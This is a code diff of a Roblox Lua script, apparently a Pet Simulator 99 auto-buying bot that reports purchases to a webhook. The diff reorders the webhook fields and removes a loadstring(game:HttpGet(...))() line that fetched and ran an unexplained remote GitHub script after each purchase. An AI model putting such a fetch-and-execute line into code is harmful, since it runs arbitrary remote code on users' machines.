@@ -71,37 +71,25 @@ local function processListingInfo(uid, gems, item, version, shiny, amount, bough
                 ["timestamp"] = DateTime.now():ToIsoDate(),
                 ['fields'] = {
                     {
-                        ['name'] = "*PURCHASE INFO:*"
-                        ['value'] = "\n\n",
-                    },
-                    {
                         ['name'] = "PRICE:",
                         ['value'] = tostring(gems) .. " GEMS",
-		    },
+                    },
+                    {
+                        ['name'] = "BOUGHT FROM:",
+                        ['value'] = tostring(boughtFrom),
+                    },
                     {
                         ['name'] = "AMOUNT:",
                         ['value'] = tostring(amount),
                     },
                     {
-                        ['name'] = "BOUGHT FROM:",
-                        ['value'] = "||" .. tostring(boughtFrom) .. "||",
-                    },
-                    {
-                        ['name'] = "PETID:",
-                        ['value'] = "||" .. tostring(uid) .. "|| \n\n",
-                    },
-		    {
-                    	['name'] = "*USER INFO:*",
-                        ['value'] = "\n\n",
-                    },
-		    {
-                   	['name'] = "USER:",
-                    	['value'] = "||" .. game.Players.LocalPlayer.Name .. "||",
-                    },
-                    {
                         ['name'] = "REMAINING GEMS:",
                         ['value'] = tostring(gemamount),
                     },      
+                    {
+                        ['name'] = "PETID:",
+                        ['value'] = tostring(uid),
+                    },
                 },
             },
         }
@@ -139,8 +127,7 @@ local function checklisting(uid, gems, item, version, shiny, amount, username, p
         if boughtPet == true then
             ping = true
 	end
-        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping) 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/LordPippo/PS99/main/test.lua"))() 
+        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)  
     elseif type.titanic and gems / amount <= 10000000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         if boughtPet == true then
